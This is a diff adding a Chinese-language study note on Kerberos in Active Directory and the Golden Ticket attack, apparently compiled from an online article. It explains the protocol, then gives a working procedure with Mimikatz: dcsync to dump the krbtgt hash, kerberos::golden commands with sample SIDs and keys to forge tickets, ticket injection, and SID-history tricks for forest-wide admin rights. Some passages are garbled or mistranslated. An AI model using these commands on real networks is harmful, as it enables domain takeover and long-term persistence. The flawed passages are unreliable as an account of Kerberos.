@@ -1,0 +1,130 @@
+Kerberos是windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份验证。相互认证或请求服务的实体被称为委托人(Principal)。参与的中央服务器被称为发布中心（简称KDC）。KDC有两个服务组成：身份验证服务（Authentication Server 简称AS）和票据授予服务（Ticket Granting Server，简称TGS）。在windows域环境下，身份验证服务和票据授予服务可同时运行在任何可写域控服务器上。
+
+委托人（Principal）是一个具有唯一标识的实体，可以是一台计算机或一项服务，通过使用KDC颁发的票据来进行通信。委托人可以分为两类：用户和服务，分别具有不同种类的标识符。用户通过"user@REALM"格式的用户主体名称（User Principal Name,简称UPN来标识）。记住REALM一定是大写的。例如用户"bob"在"bhusa.com"域中应该表示为bob@BHUSA.com
+
+服务主题名称（Service Principal Name，简称SPN）是用于域中的服务和计算机账户。SPN的格式形如"serviceclass/host_port/serviceName"。例如，主机"dc1.bhusa.com"上LDAP服务的SPN可能类似于"ldap/dc1.bhusa.com","ldap/dc1"和"ldcap/dc1.bhusa.com/bhusa.com"。参考全限定主机名和仅主机名，应该服务可能注册多个SPN
+
+同通常是执行DNS查询来规范化主机名称。这就解释了DNS为什么微软Kerberos环境中的一个必要租件。查询服务"规范化"名称，然后生成请求服务的SPN。
+
+用户要访问活动目录中的一项服务访问需经过以下几个步骤
+1.客户端对用户口令执行散列运算(hash)。此hash值（即用户密钥）成为客户端和KDC共享的长期密钥（long term key）
+2.KRB_AS_REQ-客户端加密一个时间戳，然后发送给身份验证服务
+3.KRB_AS_REP-身份验证服务会解密时间戳，若解密成功，表明了客户端获得某个特定用户的口令（即验证了用户的身份）
+①短期会话密钥，用于客户端向KDC发起后续的请求，该消息经客户端的长期密钥加密。（此短期会话密钥仅适用于该客户端和KDC之间）
+②票据授予票据（Ticket Granting Ticket，简称TGT），包含有关用户名、域名、时间和组成员资格等信息。该消息经仅可知KDC的密钥加密（在Windows环境中为krbtgt账户的NT-Hash）。记住KDC不记录状态：客户端每次请求访问一项服务时，TGT都会被转发。
+4.KRB_TGS_REQ-客户端使用AS返回的会话密钥构建访问特定服务的请求。客户端把TGT连同请求一起发送到票据授予服务
+5.KRB_TGS_REP-票据授予服务向客户端发送一个服务票据（Service Ticket，简称ST），包括两个部分
+*1远程服务器的部分-包括请求用户的组员资格，时间戳，用于客户端和远程服务器之间通信的会话密钥。使用远程服务器和
+KDC共享的长期密钥加密这部分消息
+*2.客户端的部分-包含用于客户端和远程服务器之间通信的会话密钥。使用步骤3中AS回复的短期会话密钥加密这部分消息
+6.KRB_TGS_REQ-客户端把服务票据中的服务器部分和请求一起发送到远程服务器。远程服务器将直接接受该服务器票据，并不需要和KDC直接通信，因为该票据是用远程服务器和KDC共享的长期密钥加密过。解密成功即成功表名KDC已经允许了此次通信。
+
+自己理解：
+A为客户端（Principal），B为服务端
+A要登陆B，A必须有B的用户。
+A在登陆B的界面输入了用户名和明文密码Administrator/123456。A在发送请求之前会把B用户口令进行hash运算。如果验证通过，这个hash值会成为A和B通信的长期密钥。
+进行hash运算后，A会加密一个时间戳。然后发送给身份验证服务（AS）
+然后AS会解密时间戳，如果解密成功，表示A成功验证了用户的身份。然后AS会返回会话密钥构建的信息要求A访问特定服务的请求
+A会把TGT连同请求一同发送到TGS，TGS收到后会把ST发送回给B
+B收到TGS发回来的票据后，A使用票据和请求推送到远程服务器。远程服务器将直接接受该票据。
+然后A成功登陆到B
+
+通俗理解：
+你面前有一道门，门后面有钱。要通过这道门你必须要有门的钥匙，当把钥匙插入到锁里面的时候。钥匙会和锁芯进行配对，如果配对成功就会返回咔的一声。代表你能扭动钥匙解锁这把锁，如果钥匙和锁芯对不上钥匙就会被弹出来。当你扭动钥匙的时候，就代表身份验证已经通过你正在开这把锁。当这把锁被开了后你就成功拿到门后面的钱
+三、关于krbtgt账户和TGT的问题
+
+1. 问题一：微软对长期密钥的散列值不加SALT
+
+微软实现的Kerberos版本对MIT原始版本中的一个关键函数做了修改，最终降低了底层的安全性。在MIT原始版本中，首先在明文口令中添加字符串username@DOMAIN.COM，然后经过散列运算生成长期密钥。使用用户名给密码加盐，能够为碰巧密码相同的不同用户生成不同的散列值。只要涉及到密钥的操作，仍然需要使用实际的口令。
+
+在微软实现版本中，口令转换成Unicode格式，再经过MD4运算生成没有加盐的密钥。这种情况也被称为NT-Hash，和微软十多年来存储长度大于14字符的密码的格式一样。缺少salt意味着任何需要密钥的操作能够直接地使用密码的散列版本，而不是使用实际的密码。这听上去像大家耳熟能详的“pass-the-hash”攻击的根本原因。
+
+从一个攻击者的角度出发，如果能够提取该域的密码散列值，也就可以利用KRBTGT散列值来伪造TGT。虽然提取散列值看似难以实现，然而实际上，大部分渗透人员认为在普通的企业环境中这并不是一件困难的事情。我们会在白皮书下面的一个章节中作全面深入的解析。
+
+利用思路
+
+在微软活动目录中颁发的TGT是可移植的。由于Kerberos的无状态特性，TGT中并没有关于票据来源的标识信息。这意味着可以从某台计算机上导出一个有效的TGT，然后导入到该环境中其他的计算机上。新导入的票据可以用于域的身份认证，并拥有票据中指定用户的权限来访问网络资源。这种特别的攻击方法被称为“pass-the-ticket”攻击。
+
+所谓的票据攻击就是伪造票据
+
+客户端的有效性
+
+由于Kerberos是无状态的，TGT必须包含了同票据授予服务交互所需的全部信息。根据微软实现的Kerberos协议扩展（MS-KILE），KDC负责设置TGT中相应的标志位，而票据授予服务使用这些标志位来颁发服务票据。默认情况下，TGT携带了有关用户的组成员资格、票据所使用的加密类型以及票据的有效期等信息。此外，微软使用TGT来加强域上传统的和最新的身份认证策略。TGT包含一些传统的值来限制账户，例如登录时长、账户是否禁用、账户是否过期、密码失效的时间戳。
+
+五、万能票据（Golden Ticket）
+
+综上所述，微软实现的Kerberos版本中存在的一系列问题所引发的后果是：Kerberos成为了攻击者实施Post-Exploitation的游乐场。如果攻击者能够攻陷KDC和提取KRBTGT散列值。然后利用这些有限信息，攻击者能够为委托人生成任意的TGT。Mimikatz工具把这种特性称之为“万能票据”（golden ticket，直译为“黄金票据”，为突出功能上的特点，意译译为“万能票据”）。万能票据拥有一些有趣的属性，会导致传统企业域中一些严重的安全问题。
+
+首先，万能票据是全功能的TGT。也就意味着万能票据可用于Kerberos认证的任何服务。票据授予服务盲目地相信TGT中的信息，然后处理TGT并颁发服务票据。内存中插入万能票据并不需要提升权限。而且默认情况下，万能票据的有效期是10年。
+
+其次，万能票据可以用来绕过当前Kerberos有关加密策略的要求。例如，可以使用DES或RC4加密算法创建一个TGT，即使该域明确支持AES，禁止使用DES或RC4。此情况会产生一个有趣的现象：TGT使用DES加密而服务票据使用AES加密。票据授予服务似乎并不担心TGT，也不拒绝异常行为，因为没有机制让票据授予服务报告关于策略的错误。
+
+再次，万能票据并没启用任何高级账户策略的设置。微软添加了一个功能来验证服务票据的请求，以确保已禁用的TGT不能用于获得服务票据。然而，该功能的实现存在问题。只有当TGT的寿命超过20分钟时，票据授予服务才会验证TGT的有效性。如果TGT的寿命低于20分钟，票据授予服务将直接颁发服务票据，而不去验证TGT的有效性，默认情况下服务票据具有10小时的有效期。因为攻击者可以利用Mimikatz工具随心所欲的产生票据，所以攻击者只需清除旧的TGT，再替换为寿命少于20分钟的新票据，轻松突破20分钟的限制条件。
+
+最终，万能票据可以被配置成任意用户和任意组的成员。这也可以创建一个票据，票据中任何用户都可以是任意组的成员。这可以用来绕过文件服务器或其他应用程序上基于用户组的访问限制。万能票据中的用户和SID不必在活动目录中真实存在。也就意味着可以为域中不存在的用户创建TGT,并仍然可以在TGT生命周期内前20分钟内从票据授予服务获得服务票据。
+
+归根结底，在一个企业的活动目录的环境中，如果KRBTGT账户的丢失，也就意味着环境中的信任关系完全丧失。考虑到攻击者可以生成任意的Kerberos票据，能绕过对任意用户的账户策略，能够让用户成为任意组的成员，所以攻击者简直可以横行无阻。此外，鉴于KRBTGT账户极少更改散列值，攻击者可以在较长的时间内使用这些伪造的票据
+
+创建“万能票据”的所需条件：
+视频：https://www.youtube.com/watch?v=eNbujcPn5c4
+①krbtgt账户的NT-Hash：该散列值是用于Kerberos的秘密密钥，仅位于域控服务器的活动目录中。所以攻击者必须攻陷域控服务器并提权至管理员权限；（域管理员权限）
+②域账户名称：通常是域管理员“domain admin”；
+③域名称；
+④域SID：可以从域用户的SID或通过sysinternal中psGetsid.exe获得；
+
+黄金票据是伪造票据授权授权票据（TGT）
+
+黄金票据的局限性：
+黄金票据欺骗了当前域的管理权限，当KRBTGT账户密码哈希显示在作为多域AD的林一部分的子域中时存在局限性。因为是root域包含全森林管理组。由于Mimikatz通过相对标识符（RID）向票据添加了组成员资格，因此Kerberos票据中的企业管理RID在其创建的域中（基于KRBTGT账户域）被标识为本地。如果通过获取域SID和附加RID创建的域安全标识符(SID)不存在,那么Kerberons票据的持有者不会收到该级别的访问权限。换句话说，在一个多域AD森林中，如果创建的GT（黄金票据）域不包含Enterprise Admins组，则GT不会向森林中其他域提供管理权限。在单个域控AD林中不存在局限性。换句话说，黄金票据在多个AD（域控中）受到只有一个域控的完全控制权限。而在单个AD（域控中）无局限性。
+
+绕过黄金票据的局限性
+在迁移方案中，从DomainA迁到DomainB的用户将原始DomainA用户SID值添加到DomainB的SID History属性中。当用户使用新用户登陆DomainB时，DomainA SID将与确定访问DomainB用户组一起验证。这意味着可以将SID添加到SID历史记录以扩展访问。一旦Mimikatz支持Golden和（Silver Tickets）中的SID History，事情会变的更加有趣，因为AD Forest中的任何组都可以被包含并且用于授权访问。使用最新版本的Mimikatz，我们现在可以将SID历史记录添加到Forest Enterpise Admin组的Golden Ticket中。一旦单个域名的KRBTGT账户密码哈希被捕获到时，通过黄金票据可以伪造用户登陆到整个森林中。
+
+使用Mimikatz伪造Kerberons黄金票据
+kerberos::golden  /admin:ADMIINACCOUNTNAME  /domain:DOMAINFQDN /id:ACCOUNTRID  /sid:DOMAINSID  /krbtgt:KRBTGTPASSWORDHASH  /ptt
+生成hash值
+命令例子：kerberos::golden  /admin:darthvader  /domain:lab.adsercurity.org /id:2601  /sid: S-1-5-21-4155807533-921486164-2767329826 /krbtgt:8a2f1adcdd519a23515780021d2d178a  /ptt
+
+导出hash
+mimikatz log  "lsadump::dcsync /domain:test.local /user:krbtgt"
+找到如下信息：
+/domain：test.local
+/sid:S-1-5-21-4155807533-921486164-2767329826
+/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f
+2、生成Golden Ticket
+伪造的用户设置为god,执行:
+mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826
+/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f /user:god
+/ticket:gold.kirbi"
+生成文件gold.kirbi
+3、伪造Golden Ticket获得域控权限
+导入Golden Ticket，执行如下命令：
+kerberos::ptt c:\test\gold.kirbi
+/domain -----完整的域名，在这个例子中：“lab.adsecurity.org”
+/ sid ----域的SID,在这个例子中：“S-1-5-21-1473643419-774954089-2222329127”
+/ sids --- AD森林中账户/组的额外SID，凭证拥有权限进行欺骗。通常这将是根域Enterprise Admins组的“S-1-5-21-1473643419-774954089-5872329127-519”值。? 
+ / user ---伪造的用户名
+/groups（可选）---用户所属的组RID（第一组是主组）。添加用户或计算机帐户RID以接收相同的访问权限。默认组：513,512,520,518,519为默认的管理员组。
+/ krbtgt---域KDC服务帐户（KRBTGT）的NTLM密码哈希值。用于加密和签署TGT。
+/ ticket（可选） - 提供一个路径和名称，用于保存Golden Ticket文件以便日后使用或使用/ ptt立即将黄金票据插入内存以供使用。
+/ ptt - 作为/ ticket的替代品 - 使用它来立即将伪造的票据插入到内存中以供使用。
+/ id（可选） - 用户RID。Mimikatz默认值是500（默认管理员帐户RID）。
+/ startoffset（可选） - 票据可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值是0。
+/ endin（可选） - 票据使用时间范围。Mimikatz默认值是10年（?5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。
+/ renewmax（可选） - 续订最长票据有效期。Mimikatz默认值是10年（?5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。
+/ sids（可选） - 设置为AD林中企业管理员组（ADRootDomainSID）-519）的SID，以欺骗整个AD林（AD林中每个域中的AD管理员）的企业管理权限。
+/ aes128 - AES128密钥
+/ aes256 - AES256密钥
+黄金票默认组：
+域用户SID：S-1-5-21 <DOMAINID> -513
+域管理员SID：S-1-5-21 <DOMAINID> -512
+架构管理员SID：S-1-5-21 <DOMAINID> -518
+企业管理员SID：S-1-5-21 <DOMAINID> -519（只有在森林根域中创建伪造票证时才有效，但为AD森林管理员权限添加使用/ sids参数）
+组策略创建者所有者SID：S-1-5-21 <DOMAINID> -520
+命令格式如下：
+kerberos :: golden / user：ADMIINACCOUNTNAME / domain：DOMAINFQDN / id：ACCOUNTRID / sid：DOMAINSID / krbtgt：KRBTGTPASSWORDHASH / ptt
+
+命令示例：
+
+.\mimikatz “kerberos::golden  /user:DarthVader  /domain:rd.lab.adsecurity.org  /id:500 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321  /ptt” exit
+参考文章：https://www.cnblogs.com/backlion/p/8127868.html
